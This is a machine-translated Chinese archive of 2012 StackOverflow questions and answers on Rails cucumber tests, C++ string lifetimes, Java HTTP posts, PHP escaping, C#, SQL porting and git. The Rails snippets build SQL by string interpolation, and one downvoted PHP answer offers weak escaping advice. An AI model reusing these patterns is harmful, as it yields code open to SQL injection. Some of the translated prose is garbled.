# StackOverflow 问答 10270000-10270999

# ruby-on-rails - 为什么黄瓜测试会发生这种情况？

> ID：10270002
> 
> 赞同：0
> 
> 时间：2012-04-22T16:58:20.700
> 
> 标签：ruby-on-rails, validation, cucumber

我有这样的场景

```
Given /^initial data$/ do |table|
  @schedule_05 = Factory.build :schedule_05
  @schedule_05.save
  puts "count of rows #{@schedule_05.cycles.count}" - # is 7
end
#....... there are same steps and where filling text fields and so on/

When /^i click a submit button "([^"]*)" in form$/ do |runs|
  click_button(runs) # this is ajax request
end

Then /^count of SchOfWorkInformation is 365$/ do 
  puts "count of rows #{ScheduleOfWorking.count}" # is - 1
  s_c = ScheduleOfWorking.find_by_schedule_code("05") # is too 1
  puts "05 schedule is presents #{s_c.blank?}" # false
  unless s_c.blank?
    puts "05 schedule is presents #{s_c.date_of_countings.blank?}" #false
  end
end 
```

在我点击提交的步骤中，涉及控制器 ScheduleOfWorkingController 的填充动作

```
def filling
unless request.xhr?
  @classifier_schedule = ScheduleOfWorking.classifiers_numbers
  @schedule_number = ScheduleOfWorking.classifiers_numbers false
else
  if params[:date_begin].blank? || params[:date_end].blank?
    render :js => "alert('date fields is empty !')"
    return
  end
  ScheduleOfWorking.fill_information_for(params[:date_begin].to_date,params[:date_end].to_date)
end 
```

结尾

ScheduleOfWorking#fill_information_for

```
def self.fill_information_for(date_begin, date_end)
  sch = all
  sch.each do |e_sch|
    e_sch.date_of_countings.each do |d_counting|
      h_calculate = d_counting.roll_cycle(date_begin, date_end)
      transaction do
        SchOfWorkInformation.delete_all("(date >= '#{date_begin}' and date <= '#{date_end}') and schedule_code = #{d_counting.sch_code}")

        SchOfWorkInformation.create! h_calculate 
      end
    end
  end
end 
```

在 SchOfWorkInformation 我有这样的自定义验证方法

```
def customer_validate
s = SchOfWorkInformation.where(:date => self.date, :schedule_code => self.schedule_code).first

if !s.blank? && (new_record? || s.id != self.id)
  self.errors[:base] = "Запись не уникально!(date=#{self.date.to_s(:db)}, schedule_code=#{self.schedule_code})"
end

sch_number = schedule_code[0..1].blank? ? "0" : schedule_code[0..1]
session_number = schedule_code[2].blank? ? "0" : schedule_code[2]
logger.info "---------------------------------------"
ss_a = ScheduleOfWorking.all

s = ScheduleOfWorking.where("schedule_code='#{sch_number}'").
                      joins(:date_of_countings).
                      where("date_countings.session_number=#{session_number}")
  # In Given section of my step i load the data, but s.balnk? gives true
  if s.blank?
    self.errors[:base] = "Schedule - #{sch_number} with session number #{session_number}), is not exists in DB"
  end
end 
```

为什么我的数据在验证方法中丢失？请帮忙！

在开发环境中。所有权利，但在测试中没有。

..对不起长信..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:26:43.900

您在这些测试中使用什么数据库策略？如果它在事务中运行，则数据永远不会真正持久化到数据库中。您应该对这些步骤使用其他方法，因为无论有多少线程或进程正在运行，都可以保证数据被持久化。当您发出 ajax 请求时，它是对服务器的单独请求，并且数据库事务仅对该请求可用。

在我的应用程序中，我有一个使用共享连接的 javascript 测试设置：

```
Cucumber::Rails::Database.javascript_strategy = :shared_connection 
```

# c++ - C++ 返回字符串

> ID：10270004
> 
> 赞同：0
> 
> 时间：2012-04-22T16:58:32.927
> 
> 标签：c++, string, char, return

是否有可能做到这一点

```
std::string str(const char* s)
{  
     return std::string(s);
} 

int main() {  
    char* strz = (char*)str("asd").c_str();  
} 
```

代替：

```
int main(){  
    std::string temp = str("asd");  
    char* strz = (char*)temp.c_str();  
} 
```

我知道它应该是`const char* strz`，但我只需要在代码块内（并且没有新/删除）。从方法返回字符串后，它会查找引用（如果找不到，则删除字符串），然后调用`c_str()`. 我有很多字符（独立于我），我可以使用第二种解决方案，但它需要太多代码。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T17:02:38.947

如果您使用第二个选项 -

```
std::string temp = str("asd");
char* strz = (char*)temp.c_str(); 
```

您可能会遇到**未定义的行为**。修改内容是违法的`strz`。您必须使用`strcpy`来获得一个可变的`char`'s 数组。你的第一个也好不到哪里去，而且，它是多余的，因为你可以直接使用`string`' 构造函数。

无论如何，`char*`要从中获得 a`string`你可以这样做：

```
char* get(const std::string& str)
{
   char* ret = new char[str.length() + 1]();
   strcpy(ret,str.c_str());
   return ret;
} 
```

`delete[]`当你完成它时，你必须自己去记忆。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T17:13:45.237

除了从 const char* 到 char* 的转换之外，还有一个问题

```
char* strz = (char*)str("asd").c_str(); 
```

这会创建一个临时的 std::string ，它会在这一行的末尾被销毁。这会使 char* strz 无效。

在我看来，您应该只保留返回的 std::string 而不是将其视为临时的：

```
std::string strz = str("asd");
...
foo(strz.data()); // use strz 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T17:24:36.740

让我猜猜你想问什么并回答它：）如果我猜错了，请随意忽略：）

所以你有一些返回的函数`std::string`：

```
std::string str(...); 
```

而且您有一些旧代码使用`char*`（太旧以至于它甚至没有将其参数声明为`const char*`，即使它没有修改字符串），您想将其与结果一起使用：

```
int ugly_func1(char*) {...}
int ugly_func2(char*) {...}
int ugly_func3(char*) {...}

int main()
{
    std::string temp = str(...);
    char* temp1 = (char*)temp.c_str();
    ugly_func1(temp1);
    ugly_func2(temp1);
    ugly_func3(temp1);
} 
```

所以，不，您必须使用带有 temp 变量的语法。你不能这样写：

```
int main()
{
    char* temp = (char*)str(...).c_str();
    ugly_func1(temp);
    ugly_func2(temp);
    ugly_func3(temp);
} 
```

`str()`这是非法代码（例如在调用它之前破坏它的返回值`ugly_func1`）。令人讨厌的是，它有时可能会起作用。

# java - 发布 xml 文档，但不是通过请求参数，而是在正文中

> ID：10270005
> 
> 赞同：0
> 
> 时间：2012-04-22T16:58:33.300
> 
> 标签：java, servlets, spring-mvc

我目前使用以下方法将 xml 文件发布到 url：

```
HttpClient client = new HttpClient();
HttpPost post = new HttpPost("http://www.example.com/post/here");

File f = new File("/path/to/file/file.txt");
String str = Files.toString(f, Charset,defaultCharset());

List<NameValuePair> nvp = new ArrayList<NameValuePair>(1);
nvp.add(new BasicNameValuePair("payload", xmlFile));

post.setEntity(new UrlEncodedFormEntity(nvp));

HttpResponse response = client.execute(post); 
```

但这是添加“有效负载”的请求参数，这样当我想在我的 doPost servlet 中接收值时，我会这样做：

```
request.getParameter("payload"); 
```

我猜这个参数“有效负载”在请求标头中？

我想要做的是在请求正文中发送这个文件，所以在我的 doPost 中，我必须从流中获取数据，即：

```
... = request.getInputStream(); 
```

我怎样才能修改我的代码来做到这一点？（使用httpclient）

另外，在请求格式方面，有人可以解释两者之间的区别吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T22:13:42.157

[HttpClient](http://hc.apache.org/httpclient-3.x/performance.html#Request_Response_entity_streaming)上的Apache 文档有一个请求中的流数据示例：

```
public class FileRequestEntity implements RequestEntity {

    private File file = null;

    public FileRequestEntity(File file) {
        super();
        this.file = file;
    }

    public boolean isRepeatable() {
        return true;
    }

    public String getContentType() {
        return "text/plain; charset=UTF-8";
    }

    public void writeRequest(OutputStream out) throws IOException {
        InputStream in = new FileInputStream(this.file);
        try {
            int l;
            byte[] buffer = new byte[1024];
            while ((l = in.read(buffer)) != -1) {
                out.write(buffer, 0, l);
            }
        } finally {
            in.close();
        }
    }

    public long getContentLength() {
        return file.length();
    }
}

File myfile = new File("myfile.txt");
PostMethod httppost = new PostMethod("/stuff");
httppost.setRequestEntity(new FileRequestEntity(myfile)); 
```

至于两者的区别，它们都将数据存储在 HTTP 请求的正文中。例如，以下是一个标准的 HTTP POST 请求，带有两个 URL 编码参数 ([和](http://www.jmarshall.com/easy/http/#postmethod)`home`) `favorite flavor`。直接使用输入流也会稍微高效一些，因为不需要解析参数。

```
POST /path/script.cgi HTTP/1.0
From: frog@jmarshall.com
User-Agent: HTTPTool/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

home=Cosby&favorite+flavor=flies 
```

# php - 存储个人报价

> ID：10270006
> 
> 赞同：1
> 
> 时间：2012-04-22T16:58:37.500
> 
> 标签：php

> **可能重复：**
> [在 PHP 中停止 SQL 注入的最佳方法](https://stackoverflow.com/questions/60174/best-way-to-stop-sql-injection-in-php)

我很好奇在将文本字符串存储在数据库中之前，我应该在引用文本字符串上运行哪些函数。

如果它包含单引号以及其他双引号或其他任何内容，我想处理它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T17:01:18.827

从最有效到最少，您可以做四件事（我在这里假设 MySQL，因为它是与 PHP 最常见的组合）：

*   使用参数化查询，您就可以避免整个“逃避”的考验。
*   如果参数化查询不是一个选项，请使用 mysql_real_escape_string()。
*   `addslashes()`并且`stripslashes()`可能在特定情况下有效 - 但除非您*确切*知道自己在做什么并且除非您确定它不会使您的代码容易受到多字节注入攻击，否则不要使用它们。
*   像“去除空白”这样的方法在这里完全没用。“货物狂热的编程”，你可能会这样称呼它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T17:01:10.537

`mysql_real_escape_string()`如果您使用 MySQL，请使用。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-04-22T17:04:19.090

就php而言，您应该使用`trim() and stripslashes()`，如果您使用的是mysql，那么`mysql_real_escape_string()`

您可以按以下顺序使用它们：

首先`stripslashes()`然后

然后修剪（）

```
mysql_real_escape_string() 
```

# http - “需要客户端软件更新”的 HTTP 状态代码 - 使用什么？

> ID：10270008
> 
> 赞同：17
> 
> 时间：2012-04-22T16:58:44.180
> 
> 标签：http, upgrade, status

我需要返回哪个 HTTP 状态代码以指示“需要客户端软件更新”？例如，服务器改变了它曾经服务的数据格式，老客户端将无法使用它，因此客户端必须升级才能使用新数据。

我不想使用 404 或 410，因为我想表明它仍然是有效路径。415？没有把握。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2017-08-10T21:59:10.823

大多数评论者担心您在使用相同的 URI 时会破坏旧客户端，这是一个合理的担忧。这就是为什么许多 API 在 URI 本身中进行版本控制的原因。

也就是说，为什么不只是400？该请求来自旧客户端，因此这是一个错误的请求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-10-04T10:34:51.770

为什么不将支持的最低客户端版本作为元数据包含在 api 响应中？然后客户端可以根据需要检查并提示用户升级。无需使用特定的状态码，只需检查任何响应的元数据。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T17:54:21.727

如果它仍然是有效路径，那么您的服务器应该继续支持它，而不是指示错误。

好像你问错了问题:-)

* * *

## 回答 #4

> 赞同：-8
> 
> 时间：2015-03-31T08:18:14.250

426 需要升级

[https://en.wikipedia.org/wiki/List_of_HTTP_status_codes](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes)

426 需要升级客户端应该切换到不同的协议，例如 TLS/1.0，在升级标头字段中给出。

# c# - c# ReadLine 不读取整个文件

> ID：10270009
> 
> 赞同：3
> 
> 时间：2012-04-22T16:58:52.430
> 
> 标签：c#, readline

我使用此代码从我的文件中读取每一行，但它只读取（或者它只显示文件的最后一行）。当我在记事本中打开文件时，我可以看到不止一行。这是我正在使用的代码：

```
 using (StreamReader sr = File.OpenText(newPath))
        {
            String input;
            while ((input = sr.ReadLine()) != null)
            {

                TextBox1.Text = input;  

            } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T17:04:17.563

while 循环的每次迭代都将 TextBox1.Text 的前一个值替换为它已读取的行，因此当循环结束时，您只需使用文件中的最后一行更新 Text 属性。

考虑使用[File.ReadAllText()](http://msdn.microsoft.com/en-us/library/ms143368.aspx)代替逐行读取。

```
TextBox1.Text = File.ReadAllText(newPath); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-22T17:00:27.137

你需要使用：

```
TextBox1.Text += input; 
```

否则所描述的行为是正确的

最终您可以将样本更改为：

```
String input;
String target = String.Empty;
try {
using (StreamReader sr = File.OpenText(newPath)) 
{ 
    while ((input = sr.ReadLine()) != null) 
    { 
        target += input;   
    }
}
TextBox1.Text = target;
} catch { ... } 
```

最好的办法是将阅读过程提取到一个单独的方法中。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-22T17:00:25.093

`TextBox1.Text = input`

这会覆盖上一行。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-22T17:02:07.233

您的代码几乎是正确的，但行：

```
 TextBox1.Text = input; 
```

用“输入”覆盖 TextBox1，替换之前的内容。相反，您正在寻找附加文本。所以你要：

```
TextBox1.Text += input + "\n"; 
```

这会将每一行“添加”到文本框中，并在每一行之间添加一个新行，以替换您在使用 readLine() 抓取一行时删除的行。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-22T17:44:43.703

出于几个原因，我更喜欢 stringbuilder。使用字符串生成器的主要优点是操作字符串所需的资源更少。

StringBuilder 的用法如下所示：

```
 StringBuilder builder = new StringBuilder();
 using (StreamReader sr = File.OpenText(newPath)) {
     while ((input = sr.ReadLine()) != null) {
         builder.AppendLine(input);
     }
 }
 TextBox1.Text = builder.ToString(); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-22T17:01:36.310

如果你想单独使用每一行数据，你需要一个额外的字符串变量来分配每一行，因为对于你迭代的文件中的每一行，你都会覆盖“输入”，留下最后的值线。

# c# - 是否可以让一个应用程序配置和管理 DirectShow 过滤器，但将输出引脚绑定到不同的应用程序？

> ID：10270017
> 
> 赞同：1
> 
> 时间：2012-04-22T17:00:00.323
> 
> 标签：c#, c++, com, directshow

我是直接演出的新手，我想知道这是否可能（寻找解决方案的任何额外帮助也很好，但我更担心这是否值得追求）。

我正在 C++ 中创建 DirectShow 源过滤器，并且我正在对其进行设计，以便将 FillBuffer 调用传递给 C# 应用程序。据我了解，C# 应用程序需要加载 DirectShow 过滤器（我计划使用 DirectShowNet 库），然后请求我创建的包含辅助方法的接口（以指定 FillBuffer 函数并配置媒体源）。[这与DirectShowNet](http://directshownet.sourceforge.net/about.html)站点上的 GSSF 示例非常相似。

但是，我想知道将过滤器加载到一个应用程序中的行为是否会阻止它在另一个应用程序中使用 - 或者如果过滤器加载到不同的应用程序中，我对过滤器配置所做的更改是否不会反映。

就像我说的那样，我对 COM 或 DirectShow 不太满意。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:13:24.153

在应用程序中使用 DirectShow 过滤器意味着在此应用程序中构建图表。当您使用两个应用程序时，您将有两个图表，每个图表都有自己的过滤器实例。

我不确定您是否可以在多个应用程序中使用一个图表。工具 GraphBuilder 能够连接到现有的图，但这最初是出于调试原因而不是为了图共享而实现的。

如果您只想共享配置并且可以使用两个过滤器实例，您可以实现一个共享配置（注册表、序列化数据等）并让每个过滤器轮询配置更改。

# sql - 无法运行sql脚本

> ID：10270018
> 
> 赞同：-2
> 
> 时间：2012-04-22T17:00:06.920
> 
> 标签：sql

我无法运行此 SQL 脚本。

发生此错误：

> 消息 102，级别 15，状态 1，第 10 行
> 构造“=”附近的语法不正确。
> 消息 102，级别 15，状态 1，第 28 行
> “”的构造附近的语法不正确。 消息 102，级别 15，状态 1，第 86 行 “`”构造附近的语法不正确。`".
> Message 102, Level 15, State 1, Line 56
> Incorrect syntax near the construction of "`

我能做些什么？

```
-- phpMyAdmin SQL Dump
-- version 3.3.1
-- http://www.phpmyadmin.net
--
-- Хост: localhost
-- Время создания: Дек 29 2011 г., 16:23
-- Версия сервера: 5.5.10
-- Версия PHP: 5.2.4

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- База данных: `test`
--

-- --------------------------------------------------------

--
-- Структура таблицы `customers`
--

CREATE TABLE IF NOT EXISTS `customers` (
  `ID` int(11) NOT NULL AUTO_INCREMENT COMMENT 'идентификатор записи',
  `FIRST_NAME` varchar(30) COLLATE utf8_bin NOT NULL COMMENT 'Имя',
  `LAST_NAME` varchar(30) COLLATE utf8_bin NOT NULL COMMENT 'Фамилия',
  `PHONE` varchar(10) COLLATE utf8_bin NOT NULL COMMENT 'Телефон',
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='заказчики' AUTO_INCREMENT=9 ;

--
-- Дамп данных таблицы `customers`
--

INSERT INTO `customers` (`ID`, `FIRST_NAME`, `LAST_NAME`, `PHONE`) VALUES
(1, 'Борис', 'Петров', ''),
(2, 'Иван', 'Сидоров', ''),
(3, 'Сергей', 'Иванов', ''),
(4, 'Александр', 'Бойко', ''),
(5, 'Петр', 'Борисов', ''),
(6, 'Семён', 'Александров', ''),
(7, 'Александр', 'Лебедев', ''),
(8, 'Алексей', 'Ильин', '');

-- --------------------------------------------------------

--
-- Структура таблицы `items`
--

CREATE TABLE IF NOT EXISTS `items` (
  `ID` int(11) NOT NULL AUTO_INCREMENT COMMENT 'идентификатор записи',
  `NAME` varchar(50) COLLATE utf8_bin NOT NULL COMMENT 'название товара',
  `AMOUNT` float NOT NULL DEFAULT '0' COMMENT 'цена товара',
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_bin AUTO_INCREMENT=12 ;

--
-- Дамп данных таблицы `items`
--

INSERT INTO `items` (`ID`, `NAME`, `AMOUNT`) VALUES
(1, 'Молоток', 0),
(2, 'Бумага', 0),
(3, 'Шоколадка Snickers', 0),
(4, 'Отвёртка', 0),
(5, 'Ручка', 0),
(6, 'Шоколадка Kit-Kat', 0),
(7, 'Гаечный ключ', 0),
(8, 'Карандаш', 0),
(9, 'Конфеты Helth Bar', 0),
(10, 'Счётчик ленты', 0),
(11, 'Переплётная машина', 0);

-- --------------------------------------------------------

--
-- Структура таблицы `payments`
--

CREATE TABLE IF NOT EXISTS `payments` (
  `ID` int(11) NOT NULL AUTO_INCREMENT COMMENT 'идентификатор записи',
  `CUSTOMER_ID` int(11) NOT NULL COMMENT 'ИД заказчика. Связь с таблицей customers',
  `ITEM_ID` int(11) NOT NULL COMMENT 'ИД товара. Связь с таблицей items',
  `ITEM_COUNT` int(11) NOT NULL DEFAULT '0' COMMENT 'количество товара',
  `TRANS_TIME` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'время транзакции',
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='продажи' AUTO_INCREMENT=21 ;

--
-- Дамп данных таблицы `payments`
--

INSERT INTO `payments` (`ID`, `CUSTOMER_ID`, `ITEM_ID`, `ITEM_COUNT`, `TRANS_TIME`) VALUES
(1, 1, 6, 0, '2011-12-29 14:49:06'),
(2, 1, 9, 0, '2011-12-29 14:49:06'),
(3, 2, 2, 0, '2011-12-29 14:52:09'),
(4, 2, 8, 0, '2011-12-29 14:52:09'),
(5, 3, 4, 0, '2011-12-29 14:52:09'),
(6, 3, 7, 0, '2011-12-29 14:52:09'),
(7, 3, 10, 0, '2011-12-29 14:52:09'),
(8, 4, 5, 0, '2011-12-29 14:52:09'),
(9, 4, 8, 0, '2011-12-29 14:52:09'),
(10, 4, 11, 0, '2011-12-29 14:52:09'),
(11, 5, 1, 0, '2011-12-29 14:52:09'),
(12, 5, 4, 0, '2011-12-29 14:52:09'),
(13, 5, 10, 0, '2011-12-29 14:52:35'),
(14, 6, 5, 0, '2011-12-29 14:52:35'),
(15, 6, 11, 0, '2011-12-29 14:52:55'),
(16, 7, 1, 0, '2011-12-29 14:52:55'),
(17, 7, 4, 0, '2011-12-29 14:53:12'),
(18, 8, 3, 0, '2011-12-29 14:53:12'),
(19, 8, 9, 0, '2011-12-29 14:53:22'),
(20, 2, 11, 0, '2011-12-29 16:03:55'); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:58:00.640

您正在尝试在 SQL Server 数据库上运行 MySQL 脚本。在此之前，您需要进行许多更改。试试这个（我已将您的代码移植到 TSQL）：

```
CREATE PROCEDURE #AddDescription
    (@table sysname, @column sysname, @description sysname)
AS
    DECLARE @level2type sysname;

    IF @column COLLATE database_default IS NOT NULL
        SET @level2type = 'COLUMN'

    EXEC sys.sp_addextendedproperty
        'MS_Description', @description,
        'SCHEMA', 'dbo',
        'TABLE', @table,
        @level2type, @column
GO

IF 'customers' NOT IN (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
    WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_SCHEMA = 'dbo')
BEGIN
    CREATE TABLE [customers]
    (
        [ID] int NOT NULL IDENTITY(9,1),
        [FIRST_NAME] nvarchar(30) NOT NULL,
        [LAST_NAME] nvarchar(30) NOT NULL,
        [PHONE] nvarchar(10) NOT NULL,
        PRIMARY KEY ([ID])
    )

    EXEC #AddDescription 'customers', NULL, N'заказчики'
    EXEC #AddDescription 'customers', 'ID', N'идентификатор записи'
    EXEC #AddDescription 'customers', 'FIRST_NAME', N'Имя'
    EXEC #AddDescription 'customers', 'LAST_NAME', N'Фамилия'
    EXEC #AddDescription 'customers', 'PHONE', N'Телефон'
END

SET IDENTITY_INSERT [customers] ON

INSERT INTO [customers] ([ID], [FIRST_NAME], [LAST_NAME], [PHONE]) SELECT
1, N'Борис', N'Петров', '' UNION ALL SELECT
2, N'Иван', N'Сидоров', '' UNION ALL SELECT
3, N'Сергей', N'Иванов', '' UNION ALL SELECT
4, N'Александр', N'Бойко', '' UNION ALL SELECT
5, N'Петр', N'Борисов', '' UNION ALL SELECT
6, N'Семён', N'Александров', '' UNION ALL SELECT
7, N'Александр', N'Лебедев', '' UNION ALL SELECT
8, N'Алексей', N'Ильин', '';

SET IDENTITY_INSERT [customers] OFF

DBCC CHECKIDENT('[customers]', RESEED) WITH NO_INFOMSGS 

IF 'items' NOT IN (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
    WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_SCHEMA = 'dbo')
BEGIN
    CREATE TABLE [items]
    (
        [ID] int NOT NULL IDENTITY(12,1),
        [NAME] nvarchar(50) NOT NULL,
        [AMOUNT] float NOT NULL DEFAULT '0',
        PRIMARY KEY ([ID])
    )

    EXEC #AddDescription 'items', 'ID', N'идентификатор записи'
    EXEC #AddDescription 'items', 'NAME', N'название товара'
    EXEC #AddDescription 'items', 'AMOUNT', N'цена товара'
END

SET IDENTITY_INSERT [items] ON

INSERT INTO [items] ([ID], [NAME], [AMOUNT]) SELECT
1, N'Молоток', 0 UNION ALL SELECT
2, N'Бумага', 0 UNION ALL SELECT
3, N'Шоколадка Snickers', 0 UNION ALL SELECT
4, N'Отвёртка', 0 UNION ALL SELECT
5, N'Ручка', 0 UNION ALL SELECT
6, N'Шоколадка Kit-Kat', 0 UNION ALL SELECT
7, N'Гаечный ключ', 0 UNION ALL SELECT
8, N'Карандаш', 0 UNION ALL SELECT
9, N'Конфеты Helth Bar', 0 UNION ALL SELECT
10, N'Счётчик ленты', 0 UNION ALL SELECT
11, N'Переплётная машина', 0;

SET IDENTITY_INSERT [items] OFF

DBCC CHECKIDENT('items', RESEED) WITH NO_INFOMSGS 

IF 'payments' NOT IN (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
    WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_SCHEMA = 'dbo')
BEGIN
    CREATE TABLE [payments]
    (
        [ID] int NOT NULL IDENTITY(21,1),
        [CUSTOMER_ID] int NOT NULL,
        [ITEM_ID] int NOT NULL ,
        [ITEM_COUNT] int NOT NULL DEFAULT '0',
        [TRANS_TIME] datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY ([ID])
    )

    EXEC #AddDescription 'payments', NULL, N'продажи' 
    EXEC #AddDescription 'payments', 'ID', N'идентификатор записи'
    EXEC #AddDescription
        'payments', 'CUSTOMER_ID', N'ИД заказчика. Связь с таблицей customers'
    EXEC #AddDescription
        'payments', 'ITEM_ID', N'ИД товара. Связь с таблицей items'
    EXEC #AddDescription 'payments', 'ITEM_COUNT', N'количество товар'
    EXEC #AddDescription 'payments', 'TRANS_TIME', N'время транзакции'
END

SET IDENTITY_INSERT [payments] ON

INSERT INTO [payments]
([ID], [CUSTOMER_ID], [ITEM_ID], [ITEM_COUNT], [TRANS_TIME]) SELECT
1, 1, 6, 0, '2011-12-29T14:49:06' UNION ALL SELECT
2, 1, 9, 0, '2011-12-29T14:49:06' UNION ALL SELECT
3, 2, 2, 0, '2011-12-29T14:52:09' UNION ALL SELECT
4, 2, 8, 0, '2011-12-29T14:52:09' UNION ALL SELECT
5, 3, 4, 0, '2011-12-29T14:52:09' UNION ALL SELECT
6, 3, 7, 0, '2011-12-29T14:52:09' UNION ALL SELECT
7, 3, 10, 0, '2011-12-29T14:52:09' UNION ALL SELECT
8, 4, 5, 0, '2011-12-29T14:52:09' UNION ALL SELECT
9, 4, 8, 0, '2011-12-29T14:52:09' UNION ALL SELECT
10, 4, 11, 0, '2011-12-29T14:52:09' UNION ALL SELECT
11, 5, 1, 0, '2011-12-29T14:52:09' UNION ALL SELECT
12, 5, 4, 0, '2011-12-29T14:52:09' UNION ALL SELECT
13, 5, 10, 0, '2011-12-29T14:52:35' UNION ALL SELECT
14, 6, 5, 0, '2011-12-29T14:52:35' UNION ALL SELECT
15, 6, 11, 0, '2011-12-29T14:52:55' UNION ALL SELECT
16, 7, 1, 0, '2011-12-29T14:52:55' UNION ALL SELECT
17, 7, 4, 0, '2011-12-29T14:53:12' UNION ALL SELECT
18, 8, 3, 0, '2011-12-29T14:53:12' UNION ALL SELECT
19, 8, 9, 0, '2011-12-29T14:53:22' UNION ALL SELECT
20, 2, 11, 0, '2011-12-29T16:03:55'

SET IDENTITY_INSERT [payments] OFF

DBCC CHECKIDENT('payments', RESEED) WITH NO_INFOMSGS 

DROP PROCEDURE #AddDescription 
```

# c# - C#：在两个限制之间按顺序生成随机数

> ID：10270022
> 
> 赞同：2
> 
> 时间：2012-04-22T17:00:23.410
> 
> 标签：c#, random, double

我想在两个限制之间生成随机（双）数，比如说：lim1 和 lim2。

但是，我希望按顺序生成这些数字。例如：1 到 6 之间：1.53412 1.654564 2.213123 5.13522。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T17:09:10.267

```
public static double[] GenerateRandomOrderedNumbers(double lowerBoundInclusive, double upperBoundExclusive, int count, Random random = null)
{
    random = random ?? new Random();
    return Enumerable.Range(0, count)
        .Select(i => random.NextDouble() * (upperBoundExclusive - lowerBoundInclusive) + lowerBoundInclusive)
        .OrderBy(d => d)
        .ToArray();
} 
```

不完美，但我希望这能让你朝着正确的方向前进。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T17:09:17.540

生成随机数并将它们放在一个列表中：

```
var numbers = new List<int>();
Random random = new Random(); 
```

添加您的号码：

```
var number = random.Next(min, max); 
numbers.Add(number); 
```

然后对列表进行排序：

```
var orderList = from n
  in numbers
  orderby n
  select n; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T17:05:40.387

使用它来生成一组随机数怎么样：

```
lim1 + random.Next(lim2 - lim1) 
```

然后简单地对它们进行排序？

# 也可以看看：

*   [如何在 Java 中生成特定范围内的随机整数？](https://stackoverflow.com/questions/363681)

# git - 我可以将 GIT 远程标记为只读吗？

> ID：10270027
> 
> 赞同：45
> 
> 时间：2012-04-22T17:00:43.007
> 
> 标签：git, github

我对 GitHub 上的存储库具有读/写访问权限。我有那个 repo 的本地克隆。我希望能够从该遥控器中提取更改，但我不应该将更改推送到它。

有没有办法可以将遥控器标记为只读，这样我就不会不小心输入错误的命令并推送到它？

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2012-04-22T17:19:22.987

您可以通过以下方式关闭默认推送

```
git config push.default nothing 
```

或者为了在特定遥控器上提供更强的保护，您可以完全中断对该遥控器的推送，例如

```
git config remote.origin.pushurl "you really didn't want to do that" 
```

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2014-05-16T17:30:49.800

```
git remote set-url origin --push "hey, stop pushing" 
```

请注意，以下内容会删除显式配置的推送 URL，但随后推送将使用获取 URL，因此不是您想要的：

```
git remote set-url origin --delete --push ".*" 
```

# java - 非静态嵌套线程 - 从另一个类访问 (Java)

> ID：10270028
> 
> 赞同：0
> 
> 时间：2012-04-22T17:00:43.460
> 
> 标签：java, blackberry-jde

我在另一个类（定义它的）中创建线程对象时遇到了一些麻烦；

它是这样嵌套的：

```
public final class Sculpture extends UiApplication
{  
     final class ScreenThread extends Thread
     {
        //thread I want to access
     }
} 
```

所以在我的另一个类中我想创建线程对象，所以我尝试；

```
Sculpture.ScreenThread test = (new Sculpture).new ScreenThread(); 
```

- 此错误（在 BlackBerry Eclipse 插件中）显示“没有可访问 Sculpture 类型的封闭实例”。

据我所知，我不能取消嵌套，因为它会导致很多代码无法工作（我假设它依赖于 UiApplication），出于同样的原因，我也不能将其设为静态。

任何想法我做错了什么？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T17:13:02.317

在您当前的代码中，您定义了一个内部类，该类需要一个外部包含类的实例才能被实例化：

```
ScreenThread screenThread = new Sculpture().new ScreenThread(); 
```

如果您不需要访问外部类上下文，那么您可能需要定义一个*嵌套*类：

```
public final class Sculpture extends UiApplication {  
     static final class ScreenThread extends Thread {
        //thread I want to access
     }
} 
```

然后您可以“正常”导入和实例化它（即，无需先创建外部包含类的实例）：

```
ScreenThread screen = new ScreenThread(); 
```

